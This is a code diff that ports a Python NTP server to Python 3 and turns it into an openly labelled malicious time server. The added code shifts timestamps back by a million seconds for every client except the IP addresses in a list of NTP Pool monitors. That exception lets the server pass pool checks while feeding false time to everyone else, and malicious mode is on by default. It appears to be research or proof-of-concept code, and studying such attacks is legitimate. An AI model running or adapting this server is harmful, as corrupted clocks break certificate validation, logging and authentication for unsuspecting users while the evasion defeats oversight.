@@ -2,13 +2,28 @@ import datetime
 import socket
 import struct
 import time
-import Queue
-import mutex
+import queue
 import threading
 import select
+import argparse
 
-taskQueue = Queue.Queue()
+MALICIOUS_OFFSET = -1000000
+
+taskQueue = queue.Queue()
 stopFlag = False
+isMalicious = False
+monitorList = None
+
+def malicious_time(timestamp):
+    """Modify timestamp as malicious behaviour
+
+    Parameters:
+    timestamp -- timestamp in system time
+
+    Returns:
+    corresponding malicious time
+    """
+    return timestamp + MALICIOUS_OFFSET
 
 def system_to_ntp_time(timestamp):
     """Convert a system time to a NTP time.
@@ -57,6 +72,40 @@ def _to_time(integ, frac, n=32):
     """
     return integ + float(frac)/2**n	
 		
+class MonitorList:
+    """Monitor ip list class.
+
+    This represents the list of NTP Pool monitor IP addresses 
+    that will receive an incorrect timestamp.
+    """
+
+    def __init__(self, file_path):
+        """Constructor.
+
+        Parameters:
+        file_path      -- Path to file with IP addresses to fool
+        """
+
+        try:
+            with open(file_path) as f:
+                contents = f.read()
+                self.monitor_ips = contents.split() # Split on spaces by default
+        except Exception as e:
+            self.monitor_ips = []
+            print(e)
+        
+    def is_monitor_ip(self, ip_address):
+        """Checks whether an IP address is one of the IP addresses 
+        of the NTP Pool monitors
+
+        Parameters:
+        ip_address      -- IP address to check
+
+        Returns:
+        boolean representing if the given IP was a monitor IP
+        """
+
+        return ip_address in self.monitor_ips
 
 
 class NTPException(Exception):
@@ -241,31 +290,38 @@ class RecvThread(threading.Thread):
         threading.Thread.__init__(self)
         self.socket = socket
     def run(self):
-        global taskQueue,stopFlag
+        global taskQueue,stopFlag,isMalicious,monitorList
         while True:
             if stopFlag == True:
-                print "RecvThread Ended"
+                print("RecvThread Ended")
                 break
-            rlist,wlist,elist = select.select([self.socket],[],[],1);
+            rlist,wlist,elist = select.select([self.socket],[],[],1)
             if len(rlist) != 0:
-                print "Received %d packets" % len(rlist)
+                print("Received %d packets" % len(rlist))
                 for tempSocket in rlist:
                     try:
                         data,addr = tempSocket.recvfrom(1024)
-                        recvTimestamp = recvTimestamp = system_to_ntp_time(time.time())
+
+                        # addr is a tuple (ip, port)
+                        t = time.time()
+                        # Malicious behaviour
+                        if isMalicious and not monitorList.is_monitor_ip(addr[0]): 
+                            t = malicious_time(t)
+
+                        recvTimestamp = recvTimestamp = system_to_ntp_time(t)
                         taskQueue.put((data,addr,recvTimestamp))
-                    except socket.error,msg:
-                        print msg;
+                    except socket.error as msg:
+                        print(msg)
 
 class WorkThread(threading.Thread):
     def __init__(self,socket):
         threading.Thread.__init__(self)
         self.socket = socket
     def run(self):
-        global taskQueue,stopFlag
+        global taskQueue,stopFlag,isMalicious,monitorList
         while True:
             if stopFlag == True:
-                print "WorkThread Ended"
+                print("WorkThread Ended")
                 break
             try:
                 data,addr,recvTimestamp = taskQueue.get(timeout=1)
@@ -284,18 +340,33 @@ class WorkThread(threading.Thread):
                 sendPacket.ref_timestamp = recvTimestamp-5
                 sendPacket.SetOriginTimeStamp(timeStamp_high,timeStamp_low)
                 sendPacket.recv_timestamp = recvTimestamp
-                sendPacket.tx_timestamp = system_to_ntp_time(time.time())
+
+                # addr is a tuple (ip, port)
+                t = time.time()
+                # Malicious behaviour
+                doModifyPacket = isMalicious and not monitorList.is_monitor_ip(addr[0])
+                if doModifyPacket: 
+                    t = malicious_time(t)
+
+                sendPacket.tx_timestamp = system_to_ntp_time(t)
                 socket.sendto(sendPacket.to_data(),addr)
-                print "Sended to %s:%d" % (addr[0],addr[1])
-            except Queue.Empty:
+                print(f"[LOG] | {datetime.datetime.now().isoformat()} | {addr[0]}:{addr[1]} | Sent NTP reply (malicious: {doModifyPacket})")
+            except queue.Empty:
                 continue
                 
+parser = argparse.ArgumentParser()
+parser.add_argument('monitorList', type=str, help="path to text file of space-separated ip addresses")
+parser.add_argument('--listenPort', type=int, default=123, required=False, help="port to listen on (default 123)")
+parser.add_argument('--isMalicious', type=bool, default=True, required=False, help="indicates whether the server should be malicious (default True)")
+args = parser.parse_args()
         
+isMalicious = args.isMalicious
+monitorList = MonitorList('monitor_list.txt')
 listenIp = "0.0.0.0"
-listenPort = 123
+listenPort = args.listenPort
 socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 socket.bind((listenIp,listenPort))
-print "local socket: ", socket.getsockname();
+print(f"[LOG] | {datetime.datetime.now().isoformat()} | Started socket listening on: {socket.getsockname()}")
 recvThread = RecvThread(socket)
 recvThread.start()
 workThread = WorkThread(socket)
@@ -305,11 +376,11 @@ while True:
     try:
         time.sleep(0.5)
     except KeyboardInterrupt:
-        print "Exiting..."
+        print("Exiting...")
         stopFlag = True
         recvThread.join()
         workThread.join()
-        #socket.close()
-        print "Exited"
+        socket.close()
+        print("Exited")
         break
         
